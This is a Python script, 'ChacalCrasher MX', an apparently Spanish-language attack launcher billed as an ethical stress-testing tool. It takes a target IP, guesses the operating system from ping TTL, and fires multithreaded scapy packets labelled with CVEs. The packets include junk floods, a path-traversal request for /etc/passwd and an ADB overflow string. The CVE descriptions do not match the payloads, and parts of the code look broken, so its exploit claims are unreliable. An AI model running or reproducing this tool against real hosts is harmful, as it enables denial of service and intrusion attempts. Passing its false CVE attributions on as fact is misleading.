#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ChacalCrasher MX - Herramienta de Testeo de Stress Remoto
# Autor: Ético Hacker
# Uso exclusivo para sistemas autorizados

import os
import socket
import random
import threading
from scapy.all import *
from termcolor import colored

# =====[ CVEs 2024-2025 POR SISTEMA ]=====
VULN_DB = {
    "Windows": [
        {"cve": "CVE-2024-49113", "port": 389, "desc": "LDAPNightmare DoS (CVSS 9.8)", "payload": lambda ip: IP(dst=ip)/UDP(dport=389)/Raw(load="\x00"*512 + "MX"*128)},
        {"cve": "CVE-2024-21412", "port": 443, "desc": "SmartScreen Bypass RCE", "payload": lambda ip: IP(dst=ip)/TCP(dport=443)/Raw(load="<script>alert(1)</script>"*50)}
    ],
    "Linux": [
        {"cve": "CVE-2025-2179", "port": 22, "desc": "GlobalProtect Linux PrivEsc", "payload": lambda ip: IP(dst=ip)/TCP(dport=22, flags="UFP")/Raw(load="\xde\xad\xbe\xef"*100)},
        {"cve": "CVE-2025-24989", "port": 80, "desc": "Power Pages Acceso Ilegítimo", "payload": lambda ip: IP(dst=ip)/TCP(dport=80)/"GET /../../../etc/passwd HTTP/1.1\r\n\r\n"}
    ],
    "Android": [
        {"cve": "CVE-2025-0042", "port": 5555, "desc": "ADB Remote Command Injection", "payload": lambda ip: IP(dst=ip)/TCP(dport=5555)/"CNXN\x00\x00\x00\x01\x00\x00\x10\x00" + "A"*4096},
        {"cve": "CVE-2025-23294", "port": 8080, "desc": "NVIDIA Framework RCE", "payload": lambda ip: IP(dst=ip)/TCP(dport=8080)/"POST / HTTP/1.1\r\nHost: " + ip.encode() + "\r\nContent-Length: 10000\r\n\r\n" + "X"*10000}
    ],
    "iOS": [
        {"cve": "CVE-2025-23360", "port": 62078, "desc": "iOS Kernel Memory Corruption", "payload": lambda ip: IP(dst=ip)/TCP(dport=62078, flags="FPU")/Raw(load=random._urandom(2048))},
        {"cve": "CVE-2025-30154", "port": 5223, "desc": "APNS Data Exfiltration", "payload": lambda ip: IP(dst=ip)/TCP(dport=5223)/"APNS" + "\x00"*8 + "MX"*3000}
    ],
    "macOS": [
        {"cve": "CVE-2025-42883", "port": 3283, "desc": "NetAssistant RCE", "payload": lambda ip: IP(dst=ip)/TCP(dport=3283)/"GET /" + "../"*20 + "bin/sh HTTP/1.1\r\n\r\n"},
        {"cve": "CVE-2025-27827", "port": 548, "desc": "Apple File Protocol DoS", "payload": lambda ip: IP(dst=ip)/TCP(dport=548)/Raw(load="\xff"*1024)}
    ]
}

# =====[ DETECCIÓN DE SISTEMA ]=====
def detectar_os(ip):
    try:
        res = os.popen(f"ping -c 1 {ip}").read()
        ttl = int([x for x in res.split() if "ttl=" in x][0].split("=")[1])
        if 110 <= ttl <= 130: return "Windows"
        elif 60 <= ttl <= 70: return "Linux"
        elif 64 <= ttl <= 255: return "macOS" if check_port(ip, 3283) else "iOS"
        return "Unknown"
    except:
        return "Unknown"

def check_port(ip, port, timeout=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

# =====[ EJECUCIÓN DE ATAQUES ]=====
def lanzar_ataque(ip, os_type):
    print(colored(f"\n[+] Objetivo: {ip} | Sistema: {os_type}", "yellow"))
    if os_type not in VULN_DB:
        print(colored("[!] OS no soportado", "red"))
        return
    
    print(colored("[+] CVEs disponibles:", "cyan"))
    for idx, cve in enumerate(VULN_DB[os_type]):
        print(f"{idx+1}. {cve['cve']} ({cve['port']}): {cve['desc']}")
    
    try:
        eleccion = int(input(colored("\n[+] Selecciona CVE (1-" + str(len(VULN_DB[os_type])) + "): ", "green"))) - 1
        cve = VULN_DB[os_type][eleccion]
        print(colored(f"[+] Probando {cve['cve']} en puerto {cve['port']}...", "magenta"))
        
        # Envío masivo con hilos
        hilos = []
        for _ in range(5):
            t = threading.Thread(target=send, args=(cve['payload'](ip),), kwargs={'verbose':0})
            t.start()
            hilos.append(t)
        
        for t in hilos:
            t.join()
            
        print(colored("[+] Payloads enviados! Verifica estado del objetivo.", "green", attrs=["bold"]))
    except Exception as e:
        print(colored(f"[!] Error: {str(e)}", "red"))

# =====[ MAIN ]=====
def main():
    print(colored("\n=== CHACALCRASHER MX v3.0 ===", "red", attrs=["bold"]))
    print(colored("Herramienta Ética - Solo para investigación\n", "yellow"))
    
    target = input(colored("[+] Ingresa IP objetivo: ", "blue"))
    os_type = detectar_os(target)
    
    if os_type == "Unknown":
        print(colored("[!] No se detectó OS. Usando modo genérico...", "yellow"))
        os_type = random.choice(list(VULN_DB.keys()))
    
    lanzar_ataque(target, os_type)
    print(colored("\n[!] Recuerda: Solo para pruebas autorizadas. No abuses.", "red", attrs=["bold"]))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Detenido por usuario", "red"))
